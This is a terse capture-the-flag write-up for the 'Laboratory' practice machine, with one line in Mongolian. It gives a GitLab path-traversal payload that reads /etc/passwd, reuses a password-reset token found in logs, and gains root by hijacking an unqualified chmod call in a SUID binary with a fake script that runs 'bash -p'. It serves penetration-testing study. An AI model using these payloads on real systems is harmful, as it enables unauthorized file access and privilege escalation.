# Laboratory - GitLab File Read / Docker-security Unknown SUID

**Needed:** `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`

`/var/log/gitlab/gitlab-rails/production.log`

## GitLab File read

https://github.com/avrah/gitlab-rce

1. Create two projects
2. Add an issue with the following description:

```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

## Reset Dexter user's pass Gitlab

`/var/log/gitlab/gitlab-rails/production.log`

http://git.laboratory.htb/users/password/edit?reset_password_token=`<TOKEN>`

## Shell as Root

Docker-security unknown binary located with SUID permission.

```bash
find / -perm -u=s -type f 2>/dev/null
```

[image]

chmod-ийн замыг бүрэн тохируулж (/usr/bin/chmod) өгөөгүй тул үүнийг exploit хийж болно.

```bash
ltrace docker-security
```

[image]

```bash
nano /tmp/chmod
#!/bin/bash
bash -p
```
